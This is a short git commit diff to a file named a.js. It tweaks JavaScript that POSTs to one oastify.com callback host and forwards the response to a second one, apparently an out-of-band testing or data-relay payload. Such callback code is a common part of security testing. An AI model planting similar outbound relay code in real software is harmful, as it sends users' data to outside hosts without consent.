cfe75eaf923c54632d739ecd660a5a38ae24d9f6
Imran nissar <38746061+imrannissar@users.noreply.github.com>
2024-01-25 11:25:56 +0530

    sd

--- a.js
+++ a.js
@@ -7,7 +7,7 @@ fetch("https://rgb1o92umu8wcv8og2u2nyg7fylw9nxc.oastify.com/send/", {
   body: JSON.stringify({
   }),
 })
-  .then(response => response.json())
+  .then(response => response.text())
   .then(data => {
     fetch("https://ibxsj0xlhl3n7m3fbtptipbyapgo4es3.oastify.com/receive/", {
       method: "POST",
